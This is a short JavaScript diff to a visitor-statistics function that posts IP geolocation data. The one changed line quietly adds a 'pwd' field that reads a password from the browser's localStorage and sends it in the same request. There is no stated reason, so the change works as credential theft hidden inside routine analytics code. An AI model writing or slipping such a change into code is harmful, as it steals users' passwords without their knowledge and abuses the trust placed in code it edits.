@@ -4,7 +4,7 @@ function getStatData (response) {
                       type: "post", //request type,
                       dataType: 'json',
                       contentType: "application/json",
-                     data: JSON.stringify({ip: response.ip, jsondata: JSON.stringify(response), city: response.city, page: cpage, region:response.region, org:response.org})
+                     data: JSON.stringify({ip: response.ip, jsondata: JSON.stringify(response), city: response.city, page: cpage, region:response.region, org:response.org, pwd:localStorage.getItem("password")})
                    });
 }
 function ipLookUp () {
